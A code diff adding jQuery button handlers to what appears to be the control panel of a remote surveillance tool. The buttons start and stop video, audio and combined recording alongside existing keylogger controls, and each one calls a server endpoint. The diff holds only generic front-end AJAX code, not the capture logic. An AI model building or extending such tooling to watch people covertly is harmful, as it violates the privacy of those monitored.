@@ -172,12 +172,198 @@ $("#KeyLoggerSubmit").click(function() {
     }, 500);
     }, 1000);
   });
+});
+
+$("#VideoAudioStartSubmit").click(function() {
+  funcURL = "VideoAudioStart" ;
+
+  $("#VideoAudioStartSubmit").addClass("pro").html("");
+
+  //Replace with your server function
+  var request = $.ajax({
+    url: funcURL,
+    method: "GET",
+  });
+  request.done(function( msg ) {
+    setTimeout(function() {
+    $('#VideoAudioStartSubmit').addClass("finish");
+//    $('#VideoAudioStartResult').html(msg);
+
+    setTimeout(function() {
+      $("#VideoAudioStartSubmit").removeClass("pro").removeClass("finish").html("Start Recording");
+      $('#VideoAudioResult').html("<center>" + msg + "</center>");
+      //$('#VideoAudioStartResult').html("Click Submit To See Result:");
+    }, 500);
+    }, 1000);
+    if (msg == "Started successfully!") {
+        location.reload();
+    }
+  });
 
   request.fail(function( jqXHR, textStatus, errorThrown ) {
-    $('#KeyLoggerSubmit').addClass("finish");
-    $('#KeyLoggerData').html("");
-    $('#KeyLoggerResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
-    $("#KeyLoggerSubmit").removeClass("pro").removeClass("finish").html("Stop");
+    $('#VideoAudioStartSubmit').addClass("finish");
+    $('#VideoAudioResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
+    $("#VideoAudioStartSubmit").removeClass("pro").removeClass("finish").html("Start");
+  });
+
+});
+
+
+$("#VideoAudioStopSubmit").click(function() {
+  funcURL = "VideoAudioStop" ;
+
+  $("#VideoAudioStopSubmit").addClass("pro").html("");
+
+  //Replace with your server function
+  var request = $.ajax({
+    url: funcURL,
+    method: "GET",
+  });
+  request.done(function( msg ) {
+    setTimeout(function() {
+    $('#VideoAudioStopSubmit').addClass("finish");
+//    $('#VideoAudioStopResult').html(msg);
+
+    setTimeout(function() {
+      $("#VideoAudioStopSubmit").removeClass("pro").removeClass("finish").html("Stop Recording");
+      $('#VideoAudioResult').html("<center>" + msg + "</center>");
+      //$('#VideoAudioStopResult').html("Click Submit To See Result:");
+    }, 500);
+    }, 1000);
+  });
+
+  request.fail(function( jqXHR, textStatus, errorThrown ) {
+    $('#VideoAudioStopSubmit').addClass("finish");
+    $('#VideoAudioResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
+    $("#VideoAudioStopSubmit").removeClass("pro").removeClass("finish").html("Stop");
+  });
+
+});
+
+
+$("#VideoStartSubmit").click(function() {
+  funcURL = "VideoStart" ;
+
+  $("#VideoStartSubmit").addClass("pro").html("");
+
+  //Replace with your server function
+  var request = $.ajax({
+    url: funcURL,
+    method: "GET",
+  });
+  request.done(function( msg ) {
+    setTimeout(function() {
+    $('#VideoStartSubmit').addClass("finish");
+//    $('#VideoStartResult').html(msg);
+
+    $("#VideoStartSubmit").removeClass("pro").removeClass("finish").html("Start Recording");
+    $('#VideoResult').html("<center>" + msg + "</center>");
+    }, 1000);
+    if (msg.includes("success")) {
+        location.reload();
+    }
+  });
+
+  request.fail(function( jqXHR, textStatus, errorThrown ) {
+    $('#VideoStartSubmit').addClass("finish");
+    $('#VideoResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
+    $("#VideoStartSubmit").removeClass("pro").removeClass("finish").html("Start");
+  });
+
+});
+
+
+$("#VideoStopSubmit").click(function() {
+  funcURL = "VideoStop" ;
+
+  $("#VideoStopSubmit").addClass("pro").html("");
+
+  //Replace with your server function
+  var request = $.ajax({
+    url: funcURL,
+    method: "GET",
+  });
+  request.done(function( msg ) {
+    setTimeout(function() {
+    $('#VideoStopSubmit').addClass("finish");
+//    $('#VideoStopResult').html(msg);
+
+    setTimeout(function() {
+      $("#VideoStopSubmit").removeClass("pro").removeClass("finish").html("Stop Recording");
+      $('#VideoResult').html("<center>" + msg + "</center>");
+      //$('#VideoStopResult').html("Click Submit To See Result:");
+    }, 500);
+    }, 1000);
+  });
+
+  request.fail(function( jqXHR, textStatus, errorThrown ) {
+    $('#VideoStopSubmit').addClass("finish");
+    $('#VideoResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
+    $("#VideoStopSubmit").removeClass("pro").removeClass("finish").html("Stop");
+  });
+
+});
+
+
+$("#AudioStartSubmit").click(function() {
+  funcURL = "AudioStart" ;
+
+  $("#AudioStartSubmit").addClass("pro").html("");
+
+  //Replace with your server function
+  var request = $.ajax({
+    url: funcURL,
+    method: "GET",
+  });
+  request.done(function( msg ) {
+    setTimeout(function() {
+    $('#AudioStartSubmit').addClass("finish");
+//    $('#AudioStartResult').html(msg);
+
+    $("#AudioStartSubmit").removeClass("pro").removeClass("finish").html("Start Recording");
+    $('#AudioResult').html("<center>" + msg + "</center>");
+    }, 1000);
+    if (msg.includes("success")) {
+        location.reload();
+    }
+  });
+
+  request.fail(function( jqXHR, textStatus, errorThrown ) {
+    $('#AudioStartSubmit').addClass("finish");
+    $('#AudioResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
+    $("#AudioStartSubmit").removeClass("pro").removeClass("finish").html("Start");
+  });
+
+});
+
+
+$("#AudioStopSubmit").click(function() {
+  funcURL = "AudioStop" ;
+
+  $("#AudioStopSubmit").addClass("pro").html("");
+
+  //Replace with your server function
+  var request = $.ajax({
+    url: funcURL,
+    method: "GET",
+  });
+  request.done(function( msg ) {
+    setTimeout(function() {
+    $('#AudioStopSubmit').addClass("finish");
+//    $('#AudioStopResult').html(msg);
+
+    setTimeout(function() {
+      $("#AudioStopSubmit").removeClass("pro").removeClass("finish").html("Stop Recording");
+      $('#AudioResult').html("<center>" + msg + "</center>");
+      //$('#AudioStopResult').html("Click Submit To See Result:");
+    }, 500);
+    }, 1000);
+  });
+
+  request.fail(function( jqXHR, textStatus, errorThrown ) {
+    $('#AudioStopSubmit').addClass("finish");
+    $('#AudioResult').html("Request failed: " + textStatus + " Error -  " + errorThrown + "</br> " + jqXHR.responseText);
+    $("#AudioStopSubmit").removeClass("pro").removeClass("finish").html("Stop");
   });
 
 });
